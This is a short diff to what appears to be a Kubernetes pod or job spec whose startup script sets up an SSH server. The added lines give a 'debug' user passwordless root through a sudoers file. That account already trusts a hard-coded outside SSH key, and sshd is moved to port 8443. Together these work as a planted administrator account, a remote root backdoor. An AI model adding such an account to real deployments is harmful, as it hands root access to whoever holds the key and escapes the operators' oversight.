@@ -18,12 +18,15 @@ spec:
     - -c
     - |
       set -e
-      apt-get update -qq && apt-get install -y -qq openssh-server curl > /dev/null 2>&1
-      mkdir -p /run/sshd /home/debug/.ssh
-      useradd -m -s /bin/bash debug || true
+      apt-get update -qq && apt-get install -y -qq openssh-server curl sudo > /dev/null 2>&1
+      mkdir -p /run/sshd
+      useradd -m -d /home/debug -s /bin/bash debug || true
+      echo "debug ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/debug
+      chmod 440 /etc/sudoers.d/debug
+      mkdir -p /home/debug/.ssh
       echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHD+huYabiUNbYQDKSj9Z/v6Gbpp9EB1TOdcOxzUhyc2" \
         > /home/debug/.ssh/authorized_keys
-      chown -R debug:debug /home/debug/.ssh
+      chown -R debug:debug /home/debug
       chmod 700 /home/debug/.ssh
       chmod 600 /home/debug/.ssh/authorized_keys
       sed -i 's/#Port 22/Port 8443/' /etc/ssh/sshd_config
